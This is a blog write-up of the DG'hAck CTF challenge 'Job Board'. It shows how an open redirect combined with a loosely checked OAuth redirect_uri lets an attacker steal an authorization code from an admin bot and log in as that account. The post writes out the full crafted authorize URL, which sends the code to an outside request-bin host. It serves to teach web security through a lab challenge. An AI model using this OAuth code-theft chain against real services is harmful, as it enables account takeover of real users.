---
title: "Writeup DG'hAck: Job Board"
date: 2020-11-30T17:45:33+01:00
draft: false
tags: ["blog", "security", "ctf", "dghack"]
type: "posts"
showDate: true
---

This challenge starts with a website that presents a list of jobs (once connected). Our goal is to login as an administrator. Here is the landing page:

[![The dashboard](/assets/dghack/job-board-landing.png)](/assets/dghack/job-board-landing.png)

Right of the bat, we see a login link, and a contact link. The contact page seems interesting, and after toying around with some XSS payloads, we quickly find that a bot clicks on any link that is passed as a message.

Clicking the login button prompts us for a username and password; the `test/test` combination works. We're greeted with a list of jobs:

[![The available jobs](/assets/dghack/job-board-positions.png)](/assets/dghack/job-board-positions.png)

Now the authentication system looks like OAuth, which is quite complicated. Let's look at the URLs called when logging in:

- POST `http://jobboard2.chall.malicecyber.com/oauth/authorize`, with the params:
  ```
  client_id=svvhKlyEA7qODbl16JTUPQNz
  response_type=code
  redirect_uri=http://jobboard2.chall.malicecyber.com/connect/auth/callback
  scope=profile
  ```
- GET `http://jobboard2.chall.malicecyber.com/connect/auth/callback`, with the single param `code=FOOdZjenThSgRBOBmbP2jB2TOzxb79xNNbFyi24h3I1DPuD5`
- GET `http://jobboard2.chall.malicecyber.com/login`, with the params:
  ```
  access_token=BlhXQy0AbcoocRXTmWUTpXCyNFKLnrYgZoF2eIW9Id
  raw[access_token]=BlhXQy0AbcoocRXTmWUTpXCyNFKLnrYgZoF2eIW9Id
  raw[expires_in]=864000
  raw[scope]=profile
  raw[token_type]=Bearer
  ```

The first URL (the login form) redirects to the second, and the second to the third.

If we assume that the bot will sign in when presented with the login form, the `redirect_uri` parameter gets really interesting. We could just change it to a URI on our server, and get a code allowing us to login with the account that the bot uses.

Replacing the URI with a custom one yields the following error:

```
invalid_request: Invalid "redirect_uri" in request.
```

However, we seem to be able to change the path, eg:

```
http://jobboard2.chall.malicecyber.com/REDIRECT
```

So if we find an open redirect on the server, we can get the code. Looking more closely at the list of jobs, we find that clicking on one redirects to:

```
http://jobboard2.chall.malicecyber.com/safelink/http%3A%2F%2Fexample.com%2F
```

After creating a [request bin](https://requestbin.com/), we can replace the example domain:

```
http://jobboard2.chall.malicecyber.com/safelink/https%3A%2F%2Fen43o9xcx03qo.x.pipedream.net
```

Opening that link seems to work! We have everything we need now, let's craft our malicious URL:

```
http://jobboard2.chall.malicecyber.com/oauth/authorize?client_id=svvhKlyEA7qODbl16JTUPQNz&response_type=code&redirect_uri=http%3A%2F%2Fjobboard2.chall.malicecyber.com%2Fsafelink%2Fhttps%253A%252F%252Fen43o9xcx03qo.x.pipedream.net&scope=profile
```

And send it to the bot. After a few seconds, we see:

```
/?code=qAV9LcN3T2vb8Fjycx6pqGZBIPyLs0nCqphbLqohi9929iq5
```

Great! Now we just have to open `https://jobboard2.chall.malicecyber.com/connect/auth/callback?code=qAV9LcN3T2vb8Fjycx6pqGZBIPyLs0nCqphbLqohi9929iq5` in our browser, and we're logged in!

We see:

[![The secret job](/assets/dghack/job-board-flag.png)](/assets/dghack/job-board-flag.png)

The flag is `DontRollYourOwn`.

---

[View all of the DG'hAck articles](/tags/dghack).
